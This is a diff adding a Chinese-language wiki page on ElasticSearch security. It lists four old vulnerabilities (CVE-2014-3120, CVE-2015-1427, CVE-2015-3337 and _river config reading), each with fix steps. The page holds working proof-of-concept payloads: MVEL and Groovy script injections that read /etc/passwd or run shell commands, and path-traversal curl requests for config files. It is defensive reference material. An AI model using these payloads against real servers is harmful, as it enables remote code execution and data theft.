@@ -1,0 +1,81 @@
+====== ElasticSearch安全配置 ======
+==== 1、ElasticSearch简介 ====
+
+ElasticSearch是JAVA开发的一个基于Lucene的搜索服务器，它提供了一个分布式多用户能力的全文搜索引擎。
+
+很多小伙伴用ElasticSearch配合其它工具进行日志分析平台的搭建，但是ElasticSearch不同版本存在多个漏洞。
+
+----
+
+====2、ElasticSearch漏洞====
+
+=== 2.1 ElasticSearch远程命令执行(CVE-2014-3120) ===
+漏洞介绍：
+
+ElasticSearch有脚本执行(scripting)的功能，可以很方便地对查询出来的数据再加工处理。ElasticSearch用的脚本引擎是MVEL，这个引擎没有做任何的防护，或者沙盒包装，所以直接可以执行任意代码。
+
+而在ElasticSearch 1.2之前的版本中，默认配置是打开动态脚本功能的，如果用户没有更改默认配置文件，攻击者可以直接通过http请求执行任意代码。
+
+测试POC：
+
+<code>
+http://127.0.0.1:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22%2Fetc%2Fhosts%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fhosts%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%2C%22%2Fetc%2Fpasswd%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fpasswd%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%7D%7D&callback=jQuery111107529820275958627_1400564696673&_=1400564696674
+</code>
+
+修复方法：
+
+1，升级ElasticSearch为最新版本；
+
+2，在配置文件elasticsearch.yml里为每一个节点都加上：script.disable_dynamic: true。
+
+漏洞案例：
+
+[[http://wooyun.org/bugs/wooyun-2014-061672|果壳网某服务远程命令执行漏洞(非st2)]]
+
+=== 2.2 Elasticsearch Groovy命令执行漏洞(CVE-2015-1427) ===
+
+漏洞介绍：
+
+该漏洞主要存在于ElastciSearch 1.3.0-1.3.7和1.4.0-1.4.2，ElasticSearch在比较新的版本中脚本语言引擎使用了Groovy，并且加入了沙盒进行控制，危险代码会被拦截掉。由于沙盒限制不严格，导致存在该漏洞。
+
+测试POC:
+<code>
+POST http://127.0.0.1:9200/_search?pretty 
+
+{"size":1,"script_fields": {"test#": {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getInputStream())).readLines()","lang": "groovy"}}}
+</code>
+
+修复方法：
+
+1，升级ElasticSearch为最新版本；
+
+2，在配置文件elasticsearch.yml里为每一个节点都加上：script.groovy.sandbox.enabled: true。
+
+漏洞案例：
+
+[[http://www.wooyun.org/bugs/wooyun-2015-099572|启维文化某服务器ElasticSearch Groovy命令执行漏洞]]
+
+=== 2.3 Elasticsearch 任意文件读取漏洞(CVE-2015-3337) ===
+测试POC:
+
+    curl http://127.0.1.1:9200/_plugin/head/../../config/elasticsearch.yml 注意curl版本
+
+    curl http://127.0.0.1:9200/_plugin/插件名称如head/../../xx文件
+
+修复方法：
+1，升级ElasticSearch为最新版本
+
+=== 2.4 Elasticsearch 数据库配置文件读取问题 ===
+测试POC:
+
+http://localhost:9200/_river/search
+
+[[https://www.exploit-db.com/exploits/37054/|exp-db:CVE-2015-3337]]
+
+修复方法：
+
+1、安装elasticsearch官方的Shield
+
+2、添加iptables规则
+
+3、设置elasticsearch.yml文件中的network.bind_host: 内网ip,仅允许内网访问
